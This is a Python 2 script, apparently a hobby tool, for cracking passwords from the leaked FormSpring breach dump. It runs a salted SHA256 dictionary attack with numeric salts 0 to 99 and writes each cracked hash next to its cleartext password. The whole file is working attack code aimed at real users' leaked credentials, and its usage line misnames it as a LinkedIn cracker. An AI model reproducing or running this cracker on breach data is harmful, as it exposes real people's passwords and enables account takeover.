import sys
import time
from hashlib import sha256

#Password Store
class Password:
    def __init__(self, passwordHash, clearPassword):
        self.passwordHash = passwordHash
        self.clearPassword = clearPassword
        
# Password Cracker
class FormSpringPasswordCracker:

    # Initialising required variables & collections
    def __init__(self, passwordDumpFile, commonPasswordFiles):
        self.passwordDumpFile = passwordDumpFile
        self.commonPasswordFiles = commonPasswordFiles
        self.dumpDict = {}
        self.commonPwdSet = set()
        self.crackedPwdList = []
        self.counter = 0
    
    # Setting up password dump to be quickly read
    def setupDictionary(self):
        with open(self.passwordDumpFile) as dumpFile:
            for content in dumpFile.readlines():
                self.dumpDict[content.strip()] = 'uncracked'
        print "Password dump setup with",len(self.dumpDict),"entries"
    
    # Setting up the set of most common passwords.
    # Passwords can be read from multiple files separated by commas.
    # Collected common passwords are stored in set to avoid duplicates.
    def setupCommonPasswordSet(self):
        pwdFiles = self.commonPasswordFiles.split(",")
        for pwdFile in pwdFiles:
            with open(pwdFile) as passwordFile:
                for commonPwd in passwordFile.readlines():
                    self.commonPwdSet.add(commonPwd)
        print "Common password store setup with",len(self.commonPwdSet),"entries"

    # The actual cracking - FormSpring passwords were salted SHA256 hashes.
    def run(self):
        for commonPwd in self.commonPwdSet:
            for i in range(0,100):
                hashed = sha256(str(i)+commonPwd.strip()).hexdigest()
                if self.dumpDict.get(hashed,"X") == "uncracked":
                    self.dumpDict[hashed]="cracked"
                    self.crackedPwdList.append(Password(hashed,commonPwd.strip()))
        print "Cracked",len(self.crackedPwdList),"passwords"
    
    # Generates the txt file in required format
    def generateReport(self):
        with open('formspring-cracked.txt','w') as crackedFile:
            for crackedPwd in self.crackedPwdList:
                crackedFile.write(crackedPwd.passwordHash+" "+crackedPwd.clearPassword+"\n")
        print "Generated report of cracked passwords"

# Main method - Entry point
if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "Usage : python linkedin_cracker.py <password dump file> <common password files separated by comma>"
    else:
        start = time.time();
        print "\n"
        print "********************************************************"
        passwordDumpFile = sys.argv[1]
        commonPasswordFiles = sys.argv[2]
        cracker = FormSpringPasswordCracker(passwordDumpFile, commonPasswordFiles)
        cracker.setupDictionary()
        cracker.setupCommonPasswordSet()
        cracker.run()
        cracker.generateReport()
        print "Took",time.time() - start,"seconds for execution."
        print "********************************************************"
        print "\n"